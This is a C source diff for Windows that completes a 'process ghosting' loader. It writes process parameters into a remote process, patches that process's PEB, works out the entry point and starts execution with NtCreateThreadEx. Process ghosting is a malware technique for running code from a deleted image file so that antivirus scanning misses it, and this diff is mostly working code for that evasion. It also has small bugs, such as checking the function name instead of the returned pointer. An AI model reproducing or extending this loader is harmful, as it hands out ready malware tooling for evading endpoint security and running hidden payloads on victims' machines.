@@ -304,11 +304,138 @@ PCP_INFO create_cp(HANDLE hsection) {
 	return p_info;
 }
 
+// Write parameters to process
+LPVOID write_params(HANDLE hprocess, PRTL_USER_PROCESS_PARAMETERS proc_params) {
+	PVOID buffer = proc_params;
+	ULONG_PTR env_end = NULL;
+	ULONG_PTR buffer_end = (ULONG_PTR)proc_params + proc_params->Length;
+	SIZE_T buffer_size;
+	LPVOID _alloc_addr;
+
+	// Check for empty parameters
+	if (proc_params == NULL) {
+		fprintf(stderr, "[!] Empty Process Parameters\n");
+		return NULL;
+	}
+
+	// Check for environment variables
+	if (proc_params->Environment) {
+		if ((ULONG_PTR)proc_params > (ULONG_PTR)proc_params->Environment) {
+			buffer = (PVOID)proc_params->Environment;
+		}
+
+		env_end = (ULONG_PTR)proc_params->Environment + proc_params->EnvironmentSize;
+
+		if (env_end > buffer_end) {
+			buffer_end = env_end;
+		}
+	}
+
+	// Calculate buffer size
+	buffer_size = buffer_end - (ULONG_PTR)buffer;
+
+    // --------------------------------------------------------------------------------------------------
+	if (VirtualAllocEx(hprocess, buffer, buffer_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) {
+		if (!WriteProcessMemory(hprocess, (LPVOID)proc_params, (LPVOID)proc_params, proc_params->Length, NULL)) {
+			fprintf(stderr, "[!] WriteProcessMemory() failed (0x%x)\n", GetLastError());
+			return NULL;
+		}
+	
+		if (proc_params->Environment) {
+			if (!WriteProcessMemory(hprocess, (LPVOID)proc_params->Environment, (LPVOID)proc_params->Environment, proc_params->EnvironmentSize, NULL)) {
+				fprintf(stderr, "[!] WriteProcessMemory() failed (0x%x)\n", GetLastError());
+				return NULL;
+			}
+		}
+		return (LPVOID)proc_params;
+	}
+
+	// --------------------------------------------------------------------------------------------------
+	if (!VirtualAllocEx(hprocess, (LPVOID)proc_params, proc_params->Length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) {
+		fprintf(stderr, "[!] VirtualAllocEx() failed (0x%x)\n", GetLastError());
+		return NULL;
+	}
+
+    // --------------------------------------------------------------------------------------------------
+
+	if (!WriteProcessMemory(hprocess, (LPVOID)proc_params, (LPVOID)proc_params, proc_params->Length, NULL)) {
+		fprintf(stderr, "[!] WriteProcessMemory() failed (0x%x)\n", GetLastError());
+		return NULL;
+	}
+
+    // --------------------------------------------------------------------------------------------------
+
+	if (proc_params->Environment) {
+		if (!VirtualAllocEx(hprocess, (LPVOID)proc_params->Environment, proc_params->EnvironmentSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) {
+			fprintf(stderr, "[!] VirtualAllocEx() failed (0x%x)\n", GetLastError());
+			return NULL;
+		}
+		if (!WriteProcessMemory(hprocess, (LPVOID)proc_params->Environment, (LPVOID)proc_params->Environment, proc_params->EnvironmentSize, NULL)) {
+			fprintf(stderr, "[!] WriteProcessMemory() failed (0x%x)\n", GetLastError());
+			return NULL;
+		}
+	}
+
+	return (LPVOID)proc_params;
+}
+
+// Read process environment block
+PEB * read_peb(HANDLE hprocess, PROCESS_BASIC_INFORMATION * p_info)
+{
+	PEB * peb = (PEB *)malloc(sizeof(PEB));
+	if (peb == NULL) {
+		fprintf(stderr, "[!] Malloc() failed (0x%x)\n", GetLastError());
+		return NULL;
+	}
+
+	memset(peb, 0, sizeof(PEB));
+
+	PPEB peb_addr = p_info->PebBaseAddress;
+
+	// printf("> PEB address: 0x%08x\n", peb_addr);
+
+	NTSTATUS _status = NtReadVirtualMemory(hprocess, peb_addr, peb, sizeof(PEB), NULL);
+
+	if (!NT_SUCCESS(_status)) {
+		fprintf(stderr, "[!] Cannot read remote PEB - %08X\n", GetLastError());
+		free(peb);
+		return NULL;
+	}
+
+	return peb;
+}
+
+// Write to peb
+BOOL write_params_to_peb(PVOID lpParamsBase, HANDLE hProcess, PROCESS_BASIC_INFORMATION * stPBI)
+{
+	// Get access to the remote PEB:
+	ULONGLONG ullPEBAddress = (ULONGLONG)(stPBI->PebBaseAddress);
+	if (!ullPEBAddress) {
+		printf("Failed - Getting remote PEB address error!");
+		return FALSE;
+	}
+
+	PEB stPEBCopy = { 0 };
+	ULONGLONG ullOffset = (ULONGLONG)&stPEBCopy.ProcessParameters - (ULONGLONG)&stPEBCopy;
+
+	// Calculate offset of the parameters
+	LPVOID lpIMGBase = (LPVOID)(ullPEBAddress + ullOffset);
+
+	//Write parameters address into PEB:
+	SIZE_T lpulWritten = 0;
+	if (!WriteProcessMemory(hProcess, lpIMGBase, &lpParamsBase, sizeof(PVOID), &lpulWritten)) {
+		printf("Failed - Cannot update Params!");
+		return FALSE;
+	}
+
+	return TRUE;
+}
+
 // Set Environment Veriable
-LPVOID set_env(PCP_INFO p_info, LPWSTR w_target_name) {
+BOOL set_env(PCP_INFO p_info, LPWSTR w_target_name) {
 	DWORD ret_len = 0;
 	LPVOID env, param;
-	PEB peb_copy = { 0 };
+	PEB * peb_copy = NULL;
 	UNICODE_STRING u_tpath = { 0 };
 	UNICODE_STRING u_dll_dir = { 0 };
 	UNICODE_STRING u_curr_dir = { 0 };
@@ -325,52 +452,51 @@ LPVOID set_env(PCP_INFO p_info, LPWSTR w_target_name) {
 		&ret_len);
 
 	if (!__check_nt_status(_status, "NtQueryInformationProcess()")) {
-		
-		return NULL;
+		return FALSE;
 	}
 
 	// Copy Target Paths
 	_status = RtlInitUnicodeString(&u_tpath, w_target_name);
 	if (!__check_nt_status(_status, "RtlInitUnicodeString()")) {
-		return NULL;
+		return FALSE;
 	}
 	
 	// Copy Target Paths
 	_status = RtlInitUnicodeString(&u_tpath, w_target_name);
 	if (!__check_nt_status(_status, "RtlInitUnicodeString()")) {
-		return NULL;
+		return FALSE;
 	}
 	
 	// Get Current Directory as Wide Chars
 	if ((GetCurrentDirectoryW(MAX_PATH, w_dir_path)) == 0 ) {
 		fprintf(stderr, "[!] Failed to fetch Current Directory (0x%x)\n", GetLastError());
-		return NULL;
+		return FALSE;
 	}
 	printf("> Current Directory: %S\n", w_dir_path);
 
 	// Copy Current Directory into UNICODE_STRING
 	_status = RtlInitUnicodeString(&u_curr_dir, w_dir_path);
 	if (!__check_nt_status(_status, "RtlInitUnicodeString()")) {
-		return NULL;
+		return FALSE;
 	}
 
 	// Copy DLL Path
 	_status = RtlInitUnicodeString(&u_dll_dir, L"C:\\Windows\\System32");
 	if (!__check_nt_status(_status, "RtlInitUnicodeString()")) {
-		return NULL;
+		return FALSE;
 	}
 
 	// Name of Window
 	_status = RtlInitUnicodeString(&u_window_name, L"db_was_here");
 	if (!__check_nt_status(_status, "RtlInitUnicodeString()")) {
-		return NULL;
+		return FALSE;
 	}
 
 	// Set Environment
 	env = NULL;
 	if (!CreateEnvironmentBlock(&env, NULL, TRUE)) {
 		fprintf(stderr, "[!] CreateEnvironmentBlock() failed (0x%x)\n", GetLastError());
-		return NULL;
+		return FALSE;
 	}
 
 	_status = RtlCreateProcessParameters(
@@ -384,10 +510,33 @@ LPVOID set_env(PCP_INFO p_info, LPWSTR w_target_name) {
 			NULL, NULL, NULL);
 
 	if (!__check_nt_status(_status, "RtlCreateProcessParameters()")) {
-		return NULL;
+		return FALSE;
 	}
 
-	return NULL;
+	param = write_params(p_info->p_handle, proc_params);
+	if (param == NULL) {
+		return FALSE;
+	}
+
+	peb_copy = read_peb(p_info->p_handle, &(p_info->pb_info));
+	if (read_peb == NULL) {
+		return FALSE;
+	}
+
+	if (!write_params_to_peb(param, p_info->p_handle, &(p_info->pb_info))) {
+		printf("Failed - Cannot update PEB: %08X", GetLastError());
+		free(peb_copy);
+		return FALSE;
+	}
+	free(peb_copy);
+	
+	peb_copy = read_peb(p_info->p_handle, &(p_info->pb_info));
+	if (read_peb == NULL) {
+		return FALSE;
+	}
+	free(peb_copy);
+
+	return TRUE;
 }
 
 // Spawn a process using ghosting
@@ -443,14 +592,13 @@ int spawn_process(char* real_exe, char* fake_exe) {
 		CloseHandle(hsection);
 		return -6;
 	}
-
+	CloseHandle(hsection);
 	printf("==== Assigning Env and CL Arguments ====\n");
 
 	wchar_t * w_fname = (wchar_t*)malloc((strlen(fake_exe) + 1) * 2);
 	if (w_fname == NULL) {
 		fprintf(stderr, "[!] Failed to allocate memory for Wide File Name\n");
 		CloseHandle(p_info->p_handle);
-		CloseHandle(hsection);
 		return -7;
 	}
 
@@ -460,15 +608,54 @@ int spawn_process(char* real_exe, char* fake_exe) {
 		fprintf(stderr, "[!] MultiByteToWideChar() failed\n");
 		free(w_fname);
 		CloseHandle(p_info->p_handle);
-		CloseHandle(hsection);
 		return -8;
 	}
 		
-	set_env(p_info, w_fname);
-
+	if (!set_env(p_info, w_fname)) {
+		fprintf(stderr, "[!] Failed to set environment variables\n");
+		free(w_fname);
+		CloseHandle(p_info->p_handle);	
+		return -9;
+	} 
 	free(w_fname);
+	printf("> Set Environment and Proc Args\n");
+	
+	PEB * _peb_copy = read_peb(p_info->p_handle, &(p_info->pb_info));
+	if (_peb_copy == NULL) {
+		CloseHandle(p_info->p_handle);
+		return -10;
+	} 
+
+	PEB peb_copy = { 0 };
+	memcpy(&peb_copy, _peb_copy, sizeof(PEB));
+	free(_peb_copy);
+	ULONGLONG image_base = (ULONGLONG)(peb_copy.ImageBaseAddress);
+	ULONGLONG proc_entry = entry_point + image_base;
+	printf("0x%x\n", proc_entry);
+
+	printf("==== Creating Child Process ====\n");
+
+	HANDLE hthread = NULL;
+
+	NTSTATUS _status = NtCreateThreadEx(
+		&hthread, 
+		THREAD_ALL_ACCESS, 
+		NULL, 
+		p_info->p_handle, 
+		(LPTHREAD_START_ROUTINE)(proc_entry), 
+		NULL, 
+		FALSE, NULL, NULL, NULL, NULL);
+
+	if (!NT_SUCCESS(_status)) {
+		fprintf(stderr, "[!] NtCreateThreadEx() failed(0x%x)\n", _status);
+		return -11;
+	}
+
+	printf("> Success - Threat ID %d\r\n", GetThreadId(hthread));
+
+	WaitForSingleObject( p_info->p_handle, INFINITE);
+
 	CloseHandle(p_info->p_handle);
-	CloseHandle(hsection);
 	return 0;
 }
 
